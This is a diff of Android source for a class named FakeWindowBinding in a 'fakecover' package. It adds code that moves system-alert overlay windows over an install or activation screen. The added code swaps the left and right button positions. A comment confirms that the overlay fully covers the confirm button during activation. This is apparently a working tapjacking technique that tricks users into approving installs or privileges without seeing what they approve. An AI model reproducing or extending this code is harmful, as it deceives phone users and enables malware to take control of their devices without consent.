@@ -1,16 +1,11 @@
 package com.xstd.qm.fakecover;
 
 import android.content.Context;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
-import android.graphics.drawable.Drawable;
 import android.os.Build;
 import android.os.Handler;
-import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.view.*;
-import android.widget.ImageView;
 import android.widget.TextView;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.AppRuntime;
@@ -42,6 +37,8 @@ public class FakeWindowBinding {
     private Handler handler;
 
     private WindowManager.LayoutParams fullConfirmBtnParams;
+    private WindowManager.LayoutParams confirmBtnParams;
+    private WindowManager.LayoutParams btnParams;
     private View fullInstallView;
 
     private WindowListener mWindowListener;
@@ -112,6 +109,20 @@ public class FakeWindowBinding {
                 fullInstallView = null;
             }
 
+            if (AppRuntime.LEFT_ACTIVE_BUTTON.get()) {
+                //颠倒左右按键
+                fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                confirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+                wm.updateViewLayout(installView, confirmBtnParams);
+                wm.updateViewLayout(timerView, btnParams);
+
+                if (fullInstallView != null) {
+                    wm.updateViewLayout(fullInstallView, fullConfirmBtnParams);
+                }
+                AppRuntime.LEFT_ACTIVE_BUTTON.set(false);
+            }
+
             handler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -174,7 +185,7 @@ public class FakeWindowBinding {
          * 测试代码，确认按键全遮盖
          * 经确认可以支持激活的全遮盖
          */
-        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+        confirmBtnParams = new WindowManager.LayoutParams();
         confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
         confirmBtnParams.format = PixelFormat.RGBA_8888;
         confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
@@ -188,7 +199,7 @@ public class FakeWindowBinding {
         wm.addView(installView, confirmBtnParams);
 
         //timer
-        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
+        btnParams = new WindowManager.LayoutParams();
         btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
         btnParams.format = PixelFormat.RGBA_8888;
         btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
